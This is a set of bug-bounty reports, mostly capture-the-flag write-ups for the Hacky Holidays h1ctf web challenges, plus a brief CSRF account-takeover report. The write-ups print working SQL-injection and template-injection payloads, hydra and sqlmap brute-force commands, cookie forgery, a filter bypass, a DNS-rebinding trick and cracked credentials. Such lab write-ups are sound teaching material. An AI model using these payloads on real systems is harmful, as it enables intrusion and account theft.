Challenge 7 - Hate Mail Generator
The Hate Mail Generator app allows users to view or create new email campaigns. The emails can make use of a template, and the app allows users to preview templates before they are used. This challenge immediately appeared to require a template injection attack. The example email template had the following value in it: {{template:cbdj3_grinch_header.html}}. This template directive would cause the server to return the contents of that file when loaded.
After trying several template engine attacks, I switched to instead looking at the cbdj3_grinch_header.html page. I found that this was stored in a directory that could be listed:
<image_7>
This showed there was another file 38dhs_admins_only_header.html. Including this file in a template was not successful however! The server returned an error You do not have access to the file 38dhs_admins_only_header.html. After trying a few different things (injecting characters that were stripped out to bypass a filter - didn't work), I found that the template file could be referenced from the template data. The following POST request was used to reveal the contents of the file:
Code 743 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
8Content-Type: application/x-www-form-urlencoded
9Content-Length: 209
10Origin: https://hackyholidays.h1ctf.com
11Connection: close
12Upgrade-Insecure-Requests: 1
13
14preview_markup=yes{{template:cbdj3_/*grinch*/_header.html}}{{77}}&preview_data={"name":"admin","email":"admin@admin.com","admin":true,"administrator":true,"77":"{{template:38dhs_/*admins_only*/_header.html}}"}
The file contained the flag flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Challenge 8 - Forum
The goal for this challenge was to get admin access to the web forum. I tore my hair out on this one - it was super frustrating! After doing some testing and recon on the forum I discovered the page: https://hackyholidays.h1ctf.com/forum/phpmyadmin/. Brute forcing logins for the forum and the phpmyadmin page was not successful. There was a forum user max. I thought, "how strong of a password can a dog really have". Turns out, pretty strong.
After trying everything (SQL injection, password brute force, hidden files, LDAP injection, more password brute force), I was ready to give up. It turns out that the key to this challenge was not on the hackyholidays.h1ctf.com website at all. There was nothing to indicate this though, and I only discovered it when looking for info on some of the later challenges. The challenge author had uploaded the source code for the forum software on to Github. This included the password for the phpmyadmin page, although it was only visible in previous commits:
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
Logging in with the phpmyadmin credentials (forum/6HgeAZ0qC9T6CQIqJpD) was successful. This allowed reading of the users table:
<image_8>
Cracking the Grinch's password hash (35d652126ca1706b59db02c93e0c9fbf) revealed his password to be: BahHumbug. Thanks to the Crackstation wordlist :)
Logging in as the Grinch showed the flag: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}. It also showed the Grinch's plans - to launch a DDOS once he obtains the IP for Santa's workshop.
Challenge 9 - Evil Quiz
The evil quiz challenge was possibly the first challenge where what I thought the solution would be actually was exactly correct right from the beginning! There are three "pages" in the quiz app which allow a user to enter their name, enter their answers, and check their score. I correctly guessed that this would a "second order" SQL injection vulnerability.
I attempted to exploit this one using the --second-req parameter of Sqlmap. But in true Sqlmap fashion it just never worked :( So I ended up debating spending an hour doing it by hand or an hour battling Sqlmap. Not sure which was the better way to go, but I just did it by hand.
A "second order" SQL injection means that one page saves the SQL injection data, and a second page returns the data or triggers the injection to actually take place. We can inject our data on the page https://hackyholidays.h1ctf.com/evil-quiz with a POST request. The injection takes place in the name parameter. The result can be seen on the page https://hackyholidays.h1ctf.com/evil-quiz/score.
Testing showed that any sleep command was removed from the input, probably to stop the CTF server from dying :) I was only successful in exploiting this vulnerability as a "Boolean Based Blind" attack, which was somewhat slow going. It appears that the server runs a SQL query to determine how many other users have the same username. Since a "count" is returned, extracting data directly does not appear possible. Instead we can craft SQL queries which either return "true" or "false" to affect the count output. The following request is an example of the POST request used to trigger this attack:
Code 657 Bytes
1POST /evil-quiz HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://hackyholidays.h1ctf.com/evil-quiz
8Content-Type: application/x-www-form-urlencoded
9Content-Length: 121
10Origin: https://hackyholidays.h1ctf.com
11Connection: close
12Cookie: session=b0e2497adfcffb94cadce208c7aff1c3
13Upgrade-Insecure-Requests: 1
14
15name=test'+union+select+9,9,9,9+union+select+username,password,7,7+from+admin+where+password+like+'s3creT%25'#
The union statement in the above request causes the SQL result to either show a count of either 2 or 3. A count of 3 will only be returned if the statement select username,password,7,7 from admin where password like 's3creT%' is true (which it is):
<image_9>
Character by character the results were extracted until the full password for the admin user was discovered: S3creT_p4ssw0rd-$. The special characters in the password threw me off for a bit - turns out MySQL doesn't know how to compare whether a _ is lower or higher than the letter a. I also discovered that a MySQL like statement does a case-insensitive compare.
Logging in with the extracted credentials revealed the flag: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Challenge 10 - Signup Manager
Even thought this was challenge number 10 it ended up being pretty quick to complete. The system allows for new users to be registered, but only admin users have full access. Examining the page source showed a reference to: https://hackyholidays.h1ctf.com/signup-manager/README.md. This revealed that the full source code for this challenge could be downloaded. It also showed that a user would only be marked as admin if there was a Y in the correct user field. By default there would be a N.
Examining the PHP files used for the challenge showed that index.php did all the main work. Each user field (first name, last name, etc) would have a fixed size. Anything larger would be truncated. The exception to this was the age field which would take an integer value instead of a fixed length string. Checks were in place to ensure that the age value could only be a maximum of 3 digits. The following code handled this:
Code 257 Bytes
1if (!is_numeric($_POST["age"])) {
2                $errors[] = 'Age entered is invalid';
3            }
4            if (strlen($_POST["age"]) > 3) {
5                $errors[] = 'Age entered is too long';
6            }
7            $age = intval($_POST["age"]);
After a couple of tests, I confirmed that long age values were indeed blocked. The PHP page describing the intval function had the hint needed however: https://www.php.net/manual/en/function.intval.php
This page indicates that intval(1e10); would return 1410065408. Checking on PHP type handling showed that 1e10 also passes the is_numeric check. Since we need only 3 digits, the value 9e9 was used instead. This was combined with a first and last name of all Y, which would overflow their normal fixed position and create our account as an admin. The full POST request used was:
Code 658 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://hackyholidays.h1ctf.com/signup-manager/
8Content-Type: application/x-www-form-urlencoded
9Content-Length: 123
10Origin: https://hackyholidays.h1ctf.com
11Connection: close
12Upgrade-Insecure-Requests: 1
13Cache-Control: max-age=0
14
15action=signup&username=grinch1337&password=test99&age=9e9&firstname=YYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYY&admin=true
This revealed the flag for this challenge as flag{99309f0f-1752-44a5-af1e-a03e4150757d}. It also gave the URL for the next challenge:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59
Challenge 11 - Grinch Recon
The Grinch Recon challenge was by far the hardest challenge in this competition. The difficulty went from 0 to 100 with no warning! Rather than go through the million false attempts I made, here were the steps to successfully complete this challenge:
The https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album API has a SQL injection vulnerability. This can easily be exploited, however nothing sensitive is stored in the database.
The SQL injection can instead be used to cause the server to calculate the hash for an arbitrary image file (described below)
A path traversal can be used with the image file URL to target the /api pages instead.
Only two API endpoints exist, ping and user. The user endpoint accepts the parameters username and password.
No data can be retrieved using the image function due to content type errors. Instead, we can determine if the API request returns no data (code 204), or data (code 200).
The user API endpoint appears to be using a LIKE statement to look up users. We can insert a % symbol to do a wildcard match, and then character by character extract the valid username and password.
If the above steps sound simple enough, let me assure you, they weren't. At each step along the way I ended up trying at least 10 different things all of which failed. The initial SQL injection vulnerability was super cool I thought. Since nothing is in the database, and we need a valid "authentication hash" for the image function, we need to use the SQL injection to completely rewrite the SQL query output. I used the following SQL injection to accomplish this:
jdh34p'+union+select+'4''+union+select+3,3,''../api/user''+--+','jdh349',user()--+'
This would result in the value ../api/user being returned from the SQL query, and would cause the server to calculate the authentication hash needed for this value:
<image_10>
In the above SQL injection statement there is actually a nested SQL injection. The first injection is a union statement targeting the album table query. The second injection is a union statement targeting the photo table query. The server itself is first looking up the album id value from the album hash input. The id is then used with a second SQL query by the server to look up the photo data. Our injection to the photo query ends up being the value:
Code 32 Bytes
1' union select 3,3,'../api/user'
The quotes are double encoded so that they survive the first SQL injection and make it to the second. The end result is that we can obtain an authentication hash for any server path.
I thought this would be the end of it, but it was the start of much more frustration. After scripting requests using the SQL injection to obtain a value file hash, I discovered the /api/user endpoint. Unfortunately the server would not return any data:
<image_11>
Eventually I discovered that a % could be added to the username and password fields to extract their values character by character. This gave:
Code 42 Bytes
1username: grinchadmin
2password: s4nt4sucks
The flag after logging in to the attack box with these credentials was: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Challenge 12 - Grinch Network Attack Server
This was probably the most fun challenge. Similar to challenge 11, an "authentication hash" is needed to submit requests to the server with a target IP address. One of the thousand things I attempted in challenge 11 was brute forcing the shared secret that might have been used with the hash creation. While this entirely failed for challenge 11, it worked great for challenge 12:
<image_12>
I used the following John the Ripper rules to add the input text to a wordlist and see if it matched the known hash:
Code 60 Bytes
1[List.Rules:ExampleGrinch]
2Az"203.0.113.53"
3A0"203.0.113.53"
The prefix mrgrinch463 was in the rockyou.txt wordlist, which for some reason remains to be an awesome wordlist for password cracking. Now that the prefix is known, it is trivial to create a valid MD5 authentication hash for any target value. This challenge had a super cool "attack console", but unfortunately it wasn't just as easy as attacking localhost:
<image_13>
Input that resolves to 127.0.0.1 is blocked. I correctly guessed that a DNS rebinding attack might be needed to overcome this. An awesome, free rebinding service already exists, which is https://github.com/taviso/rbndr
Using the example DNS of 7f000001.c0a80001.rbndr.us I tried this challenge again. This DNS server will return 127.0.0.1 half of the time (using the subdomain listed), and 192.168.0.1 the other half of the time. Since each time the server is called a different IP is given, my first attempt failed. The second time was successful however! The attack check passed, and then the DDOS targeted localhost bringing down the Grinch server:
<image_14>
Conclusion and Flag Summary
Overall I had a lot of fun with this CTF. There really was only "easy/medium" and "super hard" web challenges, but it was great to complete them all!
List of flags:
flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Impact
Took down the Grinch!



==================================================

Report File: 1066083.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-Site Request Forgery (CSRF)

Contents:

Summary:
The form within the "My Account" page in ███████mil fails to verify the CSRF token used when an user makes changes such as changing the password and other details. For example, an attacker can change the user's email address, full name, phone number, etc. In this way the attacker can gain full control over the user's account.
Note
In order to get a valid CSRF token you will need to create an account and make any change in "My account" after this you can grab the value of the ██████████ token and use it in your CSRF attack.
Description:
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
## Impact
Attackers can take over accounts.
## Step-by-step Reproduction Instructions
Host the attached proof of concept in your server and change the desired values.
While authenticated visit the attacker's website that hosts the CSRF poc
On a different browser or incognito session log in with the new email address and password
Impact
Attackers can take control over any user account.



==================================================

Report File: 1066135.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Flag 1 Warm-up: flag{48104912-28b0-494a-9995-a203d1e261e7}
Checking the robots.txt the flag can be found. Also a path is revealed: /s3cr3t-ar3a
Flag 2 It's right in front of you: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
With the previously found path /s3cr3t-ar3a, the flag was hidden in plain sight. Opening the dev tools and searching for flag reveals it.
Flag 3 People Rater: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
On the front page a new button Apps appeared. One app, the People Rater is aviailable. At URL https://hackyholidays.h1ctf.com/people-rater we can use the Grinch People Rater by clicking one of the names. For example selecting Tea Avery pops an alertbox with Awful. Looking at the request in Burp:
Request:
Code 390 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7X-Requested-With: XMLHttpRequest
8Connection: close
9Referer: https://hackyholidays.h1ctf.com/people-rater
Response:
Code 208 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Tue, 15 Dec 2020 03:47:29 GMT
4Content-Type: application/json
5Connection: close
6Content-Length: 57
7
8{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
In the request, we see the parameter id=eyJpZCI6Mn0= which is an encoded base64 string. Decoding it reveals {"id":2}. Simply replacing the value with the base64 encoded variant of {"id":2}, which is eyJpZCI6MX0= leads to the following response:
Code 287 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Tue, 15 Dec 2020 03:51:22 GMT
4Content-Type: application/json
5Connection: close
6Content-Length: 135
7
8{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
Flag 4 Swag Shop: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
The objective of this challenge is to pull the Grinch's details from the online shop. We are presented with an online shop that has an API. We can fuzz the API and find the following two hidden endpoints:
Code 43 Bytes
1/swag-shop/api/sessions
2/swag-shop/api/user
The first endpoint reveals 7 different base64-encoded session tokens. One of the tokens is longer than the others. Decoding it reveals:
Code 229 Bytes
1{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
Here, we have a Universal Unique Identifier (UUID) and a cookie.
Taken a look at the /swag-shop/api/user endpoint results in:
Code 31 Bytes
1error	"Missing required fields"
So here, we are searching for a parameter. By manual testing with the information that we already collected we can identify uuid as a parameter. Requesting /swag-shop/api/user?uuid=1 responds with:
Code 36 Bytes
1error	"Could not find matching uuid"
Simply appending the UUID to the URI we found previously and accessing
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 we can pull the Grinch's details and a flag.
Code 197 Bytes
1uuid	"C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
2username	"grinch"
3address	
4line_1	"The Grinch"
5line_2	"The Cave"
6line_3	"Mount Crumpit"
7line_4	"Whoville"
8flag	"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
Flag 5 Secure Login: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
The objective of this challenge is to find a way past the login page to get to the secret area. The challenge starts with a login page. Testing a random combination for the username and password field, an Invalid Username appears. This is an indicator, that we might be able to brute-force the username and password individually based on the error code. We first try to brute-force the username with:
Code 158 Bytes
1hydra -L ~/SecLists/Usernames/Names/names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
We receive the username:access. Given the username, trying a random password leads to the error response Invalid Password. We can brute-force the password using:
Code 147 Bytes
1hydra -l access -P ~/wordlists/rockyou.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
We receive the password: computer. Logging in with the brute-forced credentials we land at a page with secure files where are No Files To Download. Investigating the response in Burp, we can notice the Cookie:
Code 82 Bytes
1eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
Doing a base64-decoding on the cookie shows:
Code 60 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}7
We change the cookie to:
Code 58 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
and encode it with base64 again:
Code 80 Bytes
1eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
With this we can see one file named my_secure_files_not_for_you.zip, which we can download locally (wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip). Trying to unzip the file, a password is requested. We can crack this with john the ripper.
Code 111 Bytes
1zip2john my_secure_files_not_for_you.zip > my_secure_files_not_for_you.txt
2john my_secure_files_not_for_you.txt
John the ripper cracks the password, which is hahahaha. With the password, we can unzip the archive and retrieve the flag.
Flag 6 My Diary: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
The objective of this challenge is to hack the Grinch's diary to find out about his upcoming event. Starting the challenge, we can directly recognize the path my-diary/?template=entries.html. It seems that the entries.html is included through the template parameter. It might also be possible to include other pages then. Through a bit of manual testing for some common pages, we can find /template=index.php, which presents the respective php code.
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Visiting the endpoint secretadmin.php we see the message You cannot view this page from your IP Address. After trying a few bypasses, it becomes clear that this seems to be a dead end. Taking a closer look at our previously found index.php we can see that the code does three things.
Special characters are eliminated
The string admin.php is eliminated
The string secretadmin.php is eliminated. To include secretadmin.php we need to bypass these restrictions. This can be achieved through the following parameter ssecretaadmin.phpdmin.phpecretaadmin.phpdmin.php. This will include the secretadmin.php file and we can retrieve the flag and see that the Grinch plans to Launch DDoS Against Santa's Workshop! on 23rd Dec.
Flag 7 Hate Mail Generator: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
In this challenge, we are asked to find the flag in the Grinch's hate mail generator. Clicking through the app, we find that the grinch uses templates:
Code 138 Bytes
1{{template:cbdj3_grinch_header.html}} 
2Hi {{name}}..... 
3Guess what..... 
4<strong>YOU SUCK!</strong>
5{{template:cbdj3_grinch_footer.html}}
From here we can see that we can include {{name}} as well as two templates. It is also possible to create a new mail for testing. If we try to include a wrong path with {{template:chron0x}} we get the response Cannot find template file /templates/chron0x. Checking the path /hate-mail-generator/templates/ we find that there exists another template: 38dhs_admins_only_header.html. However, including it in the markup results in the message: You do not have access to the file 38dhs_admins_only_header.html. On the other side including it in the Subject or Name field does not lead to such an error. Previously we also have seen, that it is possible to include {{name}}. Investigating the request in Burp, we can see that preview_data is used as a body parameter. URL decoding the parameter results in:
Code 41 Bytes
1{"name":"Alice","email":"alice@test.com"}
Here we can manipulate the name parameter to {"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"} and URL-encode it again. Providing the manipulated preview_data body parameter with {{name}} in the markup field we can access the Grinch Network Admins Only area and find the flag. The manipulated body looks like this:
Code 161 Bytes
1preview_markup=%7B%7Bname%7D%7D&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D
Flag 8 Forum: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
The objective of this challenge is to access the admin space of the Grinch's forum. In the forum, we can identify the username grinch and max. Brute-forcing for passwords with these usernames does not give any result. A directory brute-force reveals the path /forum/phpmyadmin. Here, brute-forcing does also not lead to any further results. After further searches for Grinch-Networks on Google and Github, the source code of the forum could be discovered at https://github.com/Grinch-Networks/forum. Looking at the commits, the credentials for the phpmyadmin can be discovered in the "Small fix" commit. The credentials are forum:6HgeAZ0qC9T6CQIqJpD. Clicking through the pages we can discover MD5-hashed passwords for the grinch and max at /forum/phpmyadmin?db=forum&table=user. Crackstation can crack the password of the grinch.
Code 124 Bytes
1grinch  35D652126CA1706B59DB02C93E0C9FBF    md5     BahHumbug
2max     388E015BC43980947FCE0E5DB16481D1    Unknown Not found.
Logging in with grinch:BahHumbug at /forum/login we can access the Secret Plans blogpost which further details the Grinch's DDoS attack plans as well as the flag.
FLag 9 Evil Quiz: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
In this challenge, we are participating in a quiz by the grinch. After poking around at the page we notice that the name field/parameter is vulnerable to SQL injection. Injecting ' or (select sleep(15)); -- as the name and navigating to /evil-quiz/score puts the site to sleep for 15 seconds. From this, we know that we might deal here with a second-order time-based blind SQL injection. So lets fire up sqlmap:
Code 227 Bytes
1sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=4e78bb0ffd17d4f1f67799a8d4165394" -D quiz --dump
Sqlmap finally reveals the credentials: admin:S3creT_p4ssw0rd-$. With these, we can log in to the admin panel (/evil-quiz/admin) and retrieve the flag.
Flag 10 Signup Manager: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
At the beginning of the challenge, we are presented with a login forum. After an attempt to create an account we are stuck with the message We'll have a look into you and see if you're evil enough to join the grinch army! with only the option to log out. Inspecting the source of the login page, we can see a reference to README.md in a comment at the top. Navigating to /signup-manager/README.md automatically downloads the markdown file. The content is as follows:
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
We can notice the reference to signupmanager.zip. Navigating to /signup-manager/signupmanager.zip downloads a zip file containing the source code of the application. Of the source code, only the index.php file is relevant for this challenge. In a nutshell, the code takes the username, password, age, first name, and last name as inputs, substitutes special characters, checks that their length is below a certain length, and pads them if necessary. The inputs are concatenated with a random md5 hash in between. Most importantly, the code appends the character N at the end of the string, to flag this user as non-root. The README.md, as well as the source code, reveal that access to the admin page is granted when the character Y is appended instead. Hence, the objective is to inject a Y at the end of our string through the last name parameter. Therefore the string has to be extended.
Of special interest for this challenge is the handling of the age-parameter:
Code 167 Bytes
1[...]
2if (!is_numeric($_POST["age"])) {
3    $errors[] = 'Age entered is invalid';
4}
5if (strlen($_POST["age"]) > 3) {
6    $errors[] = 'Age entered is too long';
7}
8[...]
In short, the age parameter has to be numeric and less than 3 characters. At first thought, this might only allow a maximum age of 999. However, php also allows the scientific notation with the e character. For example 1e4 will be translated to 10000. As we can see 1ex fulfills our conditions: It is numeric, fewer characters than 3, and will extend our string.
With this knowledge we can register a new user and change the payload as follows:
Code 92 Bytes
1action=signup&username=pink&password=panther&age=1e3&firstname=pink&lastname=pantherYYYYYYYY
This will forward us to the admin area and present the flag.
Flag 11 SQL Inception: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Apart from the flag, challenge 10 also presented a link: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, which is the starting point of this challenge. Be prepared for some brain toasting from here on. Browsing through the app we find that there are three albums which are requested via a hash, such as https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k. Each album requests several images, for example like https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9. Decoding the data value with base64 reveals:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
Further, there is an endpoint /r3c0n_server_4fdk59/api which states
Code 611 Bytes
1+------------------+----------------------------------------------+
2| HTTP Status Code |                 Explanation                  |
3+------------------+----------------------------------------------+
4| 200              | Successful request with data returned        |
5| 204              | Successful request but with no data found    |
6| 404              | Invalid Endpoint                             |
7| 400              | Invalid GET/POST variable                    |
8| 401              | Unauthenticated Request or Invalid client IP |
9+------------------+----------------------------------------------+
After a bit of tinkering with the app, we find that the hash parameter in album is vulnerable against SQL injection.
Code 1.50 KiB
1$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs --dump
2
3---
4Parameter: hash (GET)
5    Type: boolean-based blind
6    Title: AND boolean-based blind - WHERE or HAVING clause
7    Payload: hash=jdh34k' AND 6610=6610 AND 'Fhnh'='Fhnh
8
9    Type: UNION query
10    Title: Generic UNION query (NULL) - 3 columns
11    Payload: hash=-2048' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707a71,0x75596543734d797a5042444f5869494d5858675873624c52677a554a654f507072446f5078754469,0x7162627171)-- -
12---
13[11:09:20] [INFO] the back-end DBMS is MySQL
14back-end DBMS: MySQL 8
15[11:09:20] [INFO] fetching database names
16available databases [2]:
17[*] information_schema
18[*] recon
19
20Database: recon
21Table: album
22[3 entries]
23+----+--------+-----------+
24| id | hash   | name      |
25+----+--------+-----------+
26| 1  | 3dir42 | Xmas 2018 |
27| 2  | 59grop | Xmas 2019 |
28| 3  | jdh34k | Xmas 2020 |
29+----+--------+-----------+
30
31Database: recon
32Table: photo
33[6 entries]
34+----+----------+--------------------------------------+
35| id | album_id | photo                                |
36+----+----------+--------------------------------------+
37| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
38| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
39| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
40| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
41| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
42| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
43+----+----------+--------------------------------------+
The requests to this database might look something like this:
Code 81 Bytes
1select photo from album, photo where album.id = photo.album_id and hash = <input>
From the sqlmap output, we already know a payload: chron0x' UNION ALL SELECT NULL,NULL,"chron0x"-- -. This will print chron0x on a page. At that time a lot of people including me were stuck and in the forum, several hints regarding the movie "Inception" were dropped. It turned out that these referred to an SQL injection in the SQL injection. Following these hints and with a bit of tinkering, we can find another SQL injection in the SQL Injection.
Code 97 Bytes
1chron0x' UNION ALL SELECT "chron0x' UNION ALL SELECT NULL,NULL,'chron0x_path'-- -",null,null -- -
Using this payload, the response to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=chron0x%27%20UNION%20ALL%20SELECT%20%22chron0x%27%20UNION%20ALL%20SELECT%20NULL,NULL,%27chron0x_path%27--%20-%22,null,null%20--%20-, will try to fetch an image with the following: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2Nocm9uMHhfcGF0aCIsImF1dGgiOiJmOTNjMzI5MjI5OTU0ZWQzOWRmYTRhMzkwMTNmNjljNSJ9. Decoding the base64 payload, we can see that chron0x_path is reflected
Code 96 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/chron0x_path","auth":"f93c329229954ed39dfa4a39013f69c5"}
The response of the request to fetch this image is Expected HTTP status 200, Received: 404. Now that we found the inception SQLi, lets write a small script to explore what we just did manually a bit more.
Code 379 Bytes
1#!/bin/bash
2
3URL="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/"
4
5BASE64=$(curl -s $URL"album?hash=chron0x' UNION ALL SELECT \"chron0x' UNION ALL SELECT NULL,NULL,'$1'-- -\",null,null -- -" \
6        | grep "img-responsive" \
7        | grep -o "data\=.*" \
8        | sed "s/^data\=//g" \
9        | sed "s/\">//g")
10
11RESP=$(curl -s $URL"picture?data="$BASE64)
12
13echo $1 $RESP
The script will always respond with our input parameter and the response with respect to the picture query. Through either brute-forcing or some educated guesses we can find the following interesting responses.
Code 126 Bytes
1chron0x Expected HTTP status 200, Received: 404
2../api Invalid content type detected
3../api/user Invalid content type detected
Note you can use the above script for brute-forcing by just queying it with each line of the wordlist and grepping for the reponses. Now we know that the user endpoint exists. The next step would be to query some user information. Through an educated guess or brute-forcing we can again find a valid parameter.
Code 133 Bytes
